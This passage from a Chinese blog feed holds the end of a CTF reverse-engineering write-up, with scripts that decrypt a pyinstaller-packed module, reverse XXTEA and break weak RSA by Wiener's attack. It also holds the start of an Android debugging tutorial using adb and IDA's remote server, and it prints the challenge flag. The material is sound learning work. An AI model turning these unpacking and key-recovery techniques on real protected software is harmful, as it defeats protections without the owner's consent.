class="keyword">for</span> ii <span class="keyword">in</span> c[<span class="built_in">slice</span>(i,i+<span class="number">4</span>)]:</span><br><span class="line">            kk=(kk&lt;&lt;<span class="number">8</span>)+<span class="built_in">ord</span>(ii)</span><br><span class="line">            pp.append(kk)</span><br><span class="line">            i+=<span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> i&lt;<span class="built_in">len</span>(c):</span><br><span class="line">            ww=<span class="built_in">len</span>(pp)</span><br><span class="line">            res=encrypt(ww,pp,dd)</span><br><span class="line">    <span class="keyword">if</span> pp==oo:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"you are right!!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"gg"</span>)</span><br><span class="line">        quit()</span><br></pre></td></tr></tbody></table></figure><p>翻译出来大概是这样的</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650785245624.png" alt></p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650785253078.png" alt></p><p>这里要关注跳转的条件是not还是true</p><blockquote><p><em><em>encrypt函数是cup库里面的一个函数，当时我忽略了from cup import</em>，导致一直识别不出来encrypt函数是什么</em>*</p></blockquote><p>过程差不多都可以读出来，那个for循环就是将每四个字符转为一个int，由于不会python，很多都是自己写代码试出来的（,剩下的蹲wp了</p><blockquote><p>整个过程就是先进行RSA加密，然后调用encrypt函数加密</p></blockquote><h4 id="tip"><a class="header-anchor" href="#tip">¶</a>tip</h4><p>看了https://blog.t0hka.top/index.php/archives/36/才知道可以使用在线工具</p><p><a href="https://tool.lu/pyc/%EF%BC%8C%E6%95%88%E6%9E%9C%E5%B7%AE%E4%B8%8D%E5%A4%9A%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%98%E6%98%AF%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E4%BF%AE%E5%A4%8D%E4%B8%80%E4%B8%8B">https://tool.lu/pyc/，效果差不多，不过还是需要自己修复一下</a></p><h3 id="pyinstaller加密"><a class="header-anchor" href="#pyinstaller加密">¶</a>pyinstaller加密</h3><p><a href="https://bbs.pediy.com/thread-271253.htm">https://bbs.pediy.com/thread-271253.htm</a></p><p>我们可以在解包的时候发现两个文件，一个是加密的密钥，一个是加密的过程</p><p><img src="/2022/04/23/DASCTF-FATE-Reverse/1650785638921.png" alt></p><p>接下来只需要对PYZ文件解包（同样使用pyinxtxtractor），得到加密后的cup库即可</p><p>解密脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tinyaes</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">CRYPT_BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 从crypt_key.pyc获取key，也可自行反编译获取</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">'0000000000000tea'</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">inf = <span class="built_in">open</span>(<span class="string">'cup.pyc.encrypted'</span>, <span class="string">'rb'</span>)  <span class="comment"># 打开加密文件</span></span><br><span class="line">outf = <span class="built_in">open</span>(<span class="string">'cup.pyc'</span>, <span class="string">'wb'</span>)  <span class="comment"># 输出文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按加密块大小进行读取</span></span><br><span class="line">iv = inf.read(CRYPT_BLOCK_SIZE)</span><br><span class="line"></span><br><span class="line">cipher = tinyaes.AES(key, iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补pyc头(最后自己补也行)</span></span><br><span class="line">outf.write(<span class="string">b'\x6f\x0d\x0d\x0a\0\0\0\0\0\0\0\0\0\0\0\0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入解密数据</span></span><br><span class="line">outf.write(plaintext)</span><br><span class="line"></span><br><span class="line">inf.close()</span><br><span class="line">outf.close()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>反编译得到cup库的内容</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span></span><br><span class="line">    temp1 = (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[p &amp; <span class="number">3</span> ^ e.value] ^ z.value)</span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">ᘗ, ᘖ, ᘘ</span>):</span></span><br><span class="line">    ᘜ = <span class="number">0x9E3779B9L</span></span><br><span class="line">    ᘛ = <span class="number">6</span> + <span class="number">52</span> // ᘗ</span><br><span class="line">    total = c_uint32(<span class="number">0</span>)</span><br><span class="line">    ᘔ = c_uint32(ᘖ[ᘗ - <span class="number">1</span>])</span><br><span class="line">    ᘕ = c_uint32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> ᘛ &gt; <span class="number">0</span>:</span><br><span class="line">        total.value += ᘜ</span><br><span class="line">        ᘕ.value = total.value &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        ᘚ = c_uint32(ᘖ[<span class="number">0</span>])</span><br><span class="line">        ᘖ[ᘗ - <span class="number">1</span>] = c_uint32(ᘖ[ᘗ - <span class="number">1</span>] + MX(ᘔ, ᘚ, total, ᘘ, ᘗ - <span class="number">1</span>, ᘕ).value).value</span><br><span class="line">        ᘔ.value = ᘖ[ᘗ - <span class="number">1</span>]</span><br><span class="line">        ᘛ -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ᘛ &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> ᘖ</span><br></pre></td></tr></tbody></table></figure><p>可以看出是xxtea加密</p><h2 id="解密-v2"><a class="header-anchor" href="#解密-v2">¶</a>解密</h2><p>得到rsa的密文c</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xxtea_MX (((xxtea_z&gt;&gt;5^xxtea_y<span class="meta-string">&lt;&lt;2) + (xxtea_y&gt;</span>&gt;3^xxtea_z&lt;&lt;4)) ^ ((xxtea_sum^xxtea_y) + (xxtea_key[(xxtea_p&amp;3)^xxtea_e] ^ xxtea_z)))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxtea</span><span class="params">(<span class="keyword">uint32_t</span>* xxtea_origin, <span class="keyword">int</span> xxtea_n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> xxtea_key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">uint32_t</span> xxtea_y, xxtea_z, xxtea_sum;</span><br><span class="line">    <span class="keyword">unsigned</span> xxtea_p, xxtea_rounds, xxtea_e;</span><br><span class="line">    <span class="keyword">if</span> (xxtea_n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = <span class="number">0</span>;</span><br><span class="line">        xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_sum += xxtea_DELTA;</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = <span class="number">0</span>; xxtea_p &lt; xxtea_n - <span class="number">1</span>; xxtea_p++)</span><br><span class="line">            {</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p + <span class="number">1</span>];</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p] += xxtea_MX;</span><br><span class="line">            }</span><br><span class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>] += xxtea_MX;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (xxtea_n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    {</span><br><span class="line">        xxtea_n = -xxtea_n;</span><br><span class="line">        xxtea_rounds = <span class="number">6</span> + <span class="number">52</span> / xxtea_n;</span><br><span class="line">        xxtea_sum = xxtea_rounds * xxtea_DELTA;</span><br><span class="line">        xxtea_y = xxtea_origin[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        {</span><br><span class="line">            xxtea_e = (xxtea_sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (xxtea_p = xxtea_n - <span class="number">1</span>; xxtea_p &gt; <span class="number">0</span>; xxtea_p--)</span><br><span class="line">            {</span><br><span class="line">                xxtea_z = xxtea_origin[xxtea_p - <span class="number">1</span>];</span><br><span class="line">                xxtea_y = xxtea_origin[xxtea_p] -= xxtea_MX;</span><br><span class="line">            }</span><br><span class="line">            xxtea_z = xxtea_origin[xxtea_n - <span class="number">1</span>];</span><br><span class="line">            xxtea_y = xxtea_origin[<span class="number">0</span>] -= xxtea_MX;</span><br><span class="line">            xxtea_sum -= xxtea_DELTA;</span><br><span class="line">        } <span class="keyword">while</span> (--xxtea_rounds);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">//0x40CEA5BC,0xE7B2B2F4,0x129D12A9,0x5BC810AE,0x1D06D73D,0xDCF800DC</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[<span class="number">155</span>] = { <span class="number">3532577106</span>, <span class="number">1472742623</span>, <span class="number">3642468664</span>, <span class="number">4193500461</span>, <span class="number">2398676029</span>, <span class="number">617653972</span>, <span class="number">1474514999</span>, <span class="number">1471783658</span>, <span class="number">1012864704</span>, <span class="number">3615627536</span>, <span class="number">993855884</span>, <span class="number">438456717</span>, <span class="number">3358938551</span>, <span class="number">3906991208</span>, <span class="number">198959101</span>, <span class="number">3317190635</span>, <span class="number">3656923078</span>, <span class="number">613157871</span>, <span class="number">2398768861</span>, <span class="number">97286225</span>, <span class="number">2336972940</span>, <span class="number">1471645170</span>, <span class="number">3233163154</span>, <span class="number">583597118</span>, <span class="number">2863776301</span>, <span class="number">3183067750</span>, <span class="number">1384330715</span>, <span class="number">2929694742</span>, <span class="number">3522431804</span>, <span class="number">2181488067</span>, <span class="number">3303062236</span>, <span class="number">3825712422</span>, <span class="number">145643141</span>, <span class="number">2148976293</span>, <span class="number">2940910035</span>, <span class="number">506798154</span>, <span class="number">994590281</span>, <span class="number">2231904779</span>, <span class="number">3389770074</span>, <span class="number">2814269052</span>, <span class="number">1105937096</span>, <span class="number">1789727804</span>, <span class="number">3757028753</span>, <span class="number">2469686072</span>, <span class="number">1162286478</span>, <span class="number">680814033</span>, <span class="number">2934024098</span>, <span class="number">2162521262</span>, <span class="number">4048876895</span>, <span class="number">2121620700</span>, <span class="number">4240287315</span>, <span class="number">2391811140</span>, <span class="number">3396611602</span>, <span class="number">3091349617</span>, <span class="number">3031523010</span>, <span class="number">2486958601</span>, <span class="number">3164065171</span>, <span class="number">1285603712</span>, <span class="number">798920280</span>, <span class="number">2337813135</span>, <span class="number">4186055520</span>, <span class="number">3523024366</span>, <span class="number">1077514121</span>, <span class="number">1436444106</span>, <span class="number">2731983230</span>, <span class="number">1507202797</span>, <span class="number">500756149</span>, <span class="number">198754565</span>, <span class="number">2382448647</span>, <span class="number">880454148</span>, <span class="number">1970517398</span>, <span class="number">3217485349</span>, <span class="number">1161840191</span>, <span class="number">560498076</span>, <span class="number">1782600856</span>, <span class="number">2643721918</span>, <span class="number">1285196205</span>, <span class="number">788797746</span>, <span class="number">1195724574</span>, <span class="number">4061612551</span>, <span class="number">103427523</span>, <span class="number">2502688387</span>, <span class="number">4147162188</span>, <span class="number">617564657</span>, <span class="number">978211984</span>, <span class="number">1781482121</span>, <span class="number">2205798970</span>, <span class="number">3939973102</span>, <span class="number">3826603515</span>, <span class="number">659557668</span>, <span class="number">2582884932</span>, <span class="number">1561884856</span>, <span class="number">2217488804</span>, <span class="number">1189296962</span>, <span class="number">169145316</span>, <span class="number">2781742156</span>, <span class="number">1323893433</span>, <span class="number">824667876</span>, <span class="number">408202876</span>, <span class="number">3759637634</span>, <span class="number">4094868412</span>, <span class="number">1508996065</span>, <span class="number">162419237</span>, <span class="number">3732146944</span>, <span class="number">3083560189</span>, <span class="number">3955940127</span>, <span class="number">2393776934</span>, <span class="number">2470191468</span>, <span class="number">3620861513</span>, <span class="number">481927014</span>, <span class="number">2756226070</span>, <span class="number">3154651143</span>, <span class="number">1261069441</span>, <span class="number">2063238535</span>, <span class="number">2222237213</span>, <span class="number">101459755</span>, <span class="number">3159774417</span>, <span class="number">1721190841</span>, <span class="number">1078395785</span>, <span class="number">176506553</span>, <span class="number">3552913423</span>, <span class="number">1566142515</span>, <span class="number">1938949000</span>, <span class="number">1499289517</span>, <span class="number">3315102456</span>, <span class="number">829714860</span>, <span class="number">3843359394</span>, <span class="number">952932374</span>, <span class="number">1283577465</span>, <span class="number">2045007203</span>, <span class="number">3957761944</span>, <span class="number">3767891405</span>, <span class="number">2917089623</span>, <span class="number">3296133521</span>, <span class="number">482297421</span>, <span class="number">1734231412</span>, <span class="number">3670478932</span>, <span class="number">2575334979</span>, <span class="number">2827842737</span>, <span class="number">3413631016</span>, <span class="number">1533519803</span>, <span class="number">4008428470</span>, <span class="number">3890643173</span>, <span class="number">272960248</span>, <span class="number">317508587</span>, <span class="number">3299937500</span>, <span class="number">2440520601</span>, <span class="number">27470488</span>, <span class="number">1666674386</span>, <span class="number">1737927609</span>, <span class="number">750987808</span>, <span class="number">2385923471</span>, <span class="number">2694339191</span>, <span class="number">562925334</span>, <span class="number">2206035395</span> };</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>] = { (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">54</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">54</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">54</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">54</span> };</span><br><span class="line">    xxtea(enc, <span class="number">-155</span>, key);<span class="comment">//长度为多少，解密时第二个参数就改为多长</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">155</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, (((enc[i]) &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, ((enc[i]) &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, ((enc[i]) &amp; <span class="number">0x0000ff00</span>)&gt;&gt;<span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>, ((enc[i]) &amp; <span class="number">0xff</span>));</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>解RSA，怪我不是密码🤠,直接贴t0hka师傅的脚本了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != -<span class="number">1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    pub_key = [</span><br><span class="line">    <span class="number">0x649EE967E7916A825CC9FD3320BEABF263BEAC68C080F52824A0F521EDB6B78577EC52BF1C9E78F4BB71192F9A23F1A17AA76E5979E4D953329D3CA65FB4A71DA57412B59DFD6AEDF0191C5555D3E5F582B81B5E6B23163E9889204A81AFFDF119FE25C92F4ED59BD3285BCD7AAE14824240D2E33C5A97848F4EB7AAC203DE6330D2B4D8FF61691544FBECD120F99A157B3D2F58FA51B2887A9D06CA383C44D071314A12B17928B96F03A06E959A5AFEFA0183664F52CD32B9FC72A04B45913FCB2D5D2D3A415A14F611CF1EAC2D6C785142A8E9CC41B67A6CD85001B06EDB8CA767D367E56E0AE651491BF8A8C17A38A1835DB9E4A9292B1D86D5776C98CC25</span>,</span><br><span class="line">    <span class="number">0x647327833ACFEF1F9C83E74E171FC300FA347D4A6769476C33DA82C95120ACB38B62B33D429206FE6E9BB0BB7AB748A1036971BEA36EC47130B749C1C9FF6FE03D0F7D9FC5346EB0E575BDFA6C530AA57CD676894FC080D2DD049AB59625F4B9C78BCFD95CDCD2793E440E26E189D251121CB6EB177FEDB596409034E8B0C5BBD9BD9342235DBB226C9170EFE347FF0FD2CFF9A1F7B647CC83E4D8F005FD7125A89251C768AFE70BDD54B88116814D5030F499BCAC4673CCCC342FB4B6AC58EA5A64546DC25912B6C430529F6A7F449FD96536DE269D1A1B015A4AC6B6E46EE19DCE8143726A6503E290E4BAE6BD78319B5878981F6CFFDB3B818209341FD68B</span>]</span><br><span class="line">    <span class="comment"># 0-&gt;n,1-&gt;e</span></span><br><span class="line"></span><br><span class="line">    n = pub_key[<span class="number">0</span>]</span><br><span class="line">    e = pub_key[<span class="number">1</span>]</span><br><span class="line">    c = <span class="number">10610336534759505889607399322387179316771488492347274741918862678692508953185876570981227584004676580623553664818853686933004290078153620168054665086468417541382824708104480882577200529822968531743002301934310349005341104696887943182074473298650903541494918266823037984054778903666406545980557074219162536057146090758158128189406073809226361445046225524917089434897957301396534515964547462425719205819342172669899546965221084098690893672595962129879041507903210851706793788311452973769358455761907303633956322972510500253009083922781934406731633755418753858930476576720874219359466503538931371444470303193503733920039</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m)) <span class="comment">#  flag{You_Need_Some_Tea} </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;DASCTF-FATE-Reverse&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>安卓动调</title>
    <link href="https://gift1a.github.io/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/"/>
    <id>https://gift1a.github.io/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/</id>
    <published>2022-04-23T00:53:44.000Z</published>
    <updated>2022-04-27T01:02:14.296Z</updated>
    
    <content type="html"><![CDATA[<p>安卓动态调试</p><span id="more"></span> <h1 id="0x00-IDA调试so文件"><a class="header-anchor" href="#0x00-IDA调试so文件">¶</a>0x00-IDA调试so文件</h1><h2 id="参考文章-v7"><a class="header-anchor" href="#参考文章-v7">¶</a>参考文章</h2><p><a href="https://bbs.pediy.com/thread-262524.htm">https://bbs.pediy.com/thread-262524.htm</a></p><h2 id="实操"><a class="header-anchor" href="#实操">¶</a>实操</h2><blockquote><p><strong>注意：手机要先ROOT，调试的so文件根据系统版本来选择</strong></p></blockquote><p>我的是arm64，所以选择这个</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650937243317.png" alt></p><h3 id="打开手机的USB调试功能"><a class="header-anchor" href="#打开手机的USB调试功能">¶</a>打开手机的USB调试功能</h3><p>首先打开开发者选项，然后进入开发者选项打开USB调试</p><h3 id="adb连接手机"><a class="header-anchor" href="#adb连接手机">¶</a>adb连接手机</h3><blockquote><p>adb devices</p></blockquote><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650866742532.png" alt></p><h3 id="adb进入手机"><a class="header-anchor" href="#adb进入手机">¶</a>adb进入手机</h3><blockquote><p>adb shell</p></blockquote><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650866794822.png" alt></p><h3 id="查看手机ro-debuggable"><a class="header-anchor" href="#查看手机ro-debuggable">¶</a>查看手机ro.debuggable</h3><p>ro.debuggable是rom级别的调试，如果ro.debuggable的值是1说明你的手机已经打开了调试功能，如果为0的话需要安装的安卓app已经打开了android:debuggable属性方可调试，通常正式发布出来的apk默认android:debuggable属性都是关闭的</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650866865200.png" alt></p><blockquote><p><strong>值为0，所以需要去让安装的app开启android:debuggable属性</strong></p></blockquote><h3 id="开启被调试APK的debuggable属性"><a class="header-anchor" href="#开启被调试APK的debuggable属性">¶</a>开启被调试APK的debuggable属性</h3><p>使用APK Editor Studio查看android:debuggable属性，没有的话就需要自行添加</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650867048124.png" alt></p><p>这里我已经修改好了</p><h3 id="重新签名打包"><a class="header-anchor" href="#重新签名打包">¶</a>重新签名打包</h3><p>因为修改之后签名需要更新</p><p>在APK Editor Studio中按下Ctrl+Alt+S重新打包</p><h3 id="安装APK文件到手机中"><a class="header-anchor" href="#安装APK文件到手机中">¶</a>安装APK文件到手机中</h3><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650867221276.png" alt></p><p>此时手机中会弹出安装提示，确认即可安装</p><p>也可以使用adb安装</p><p><a href="https://blog.csdn.net/qq_43203586/article/details/104881919">https://blog.csdn.net/qq_43203586/article/details/104881919</a></p><h3 id="上传ida的远程工具"><a class="header-anchor" href="#上传ida的远程工具">¶</a>上传ida的远程工具</h3><p>在ida的dbgsrv目录下，将android_server64传入手机目录中</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650867343056.png" alt></p><blockquote><p><strong>使用命令：adb push android_server64 /data/local/tmp</strong></p></blockquote><p>使用chmod提升权限</p><p>此时在该目录下我们可以找到该文件</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650867613473.png" alt></p><h3 id="启动android-server64"><a class="header-anchor" href="#启动android-server64">¶</a>启动android_server64</h3><p>在data/local/tmp目录下直接运行</p><h3 id="启动adb端口转发"><a class="header-anchor" href="#启动adb端口转发">¶</a>启动adb端口转发</h3><blockquote><p><strong>adb forward tcp:23946 tcp:23946</strong></p></blockquote><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868122288.png" alt></p><h3 id="以调试模式启动APK"><a class="header-anchor" href="#以调试模式启动APK">¶</a>以调试模式启动APK</h3><p>启动前我们先获取Mainactivity</p><blockquote><p><strong>adb shell am start -D -n 包名路径/.Activity</strong></p></blockquote><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868216815.png" 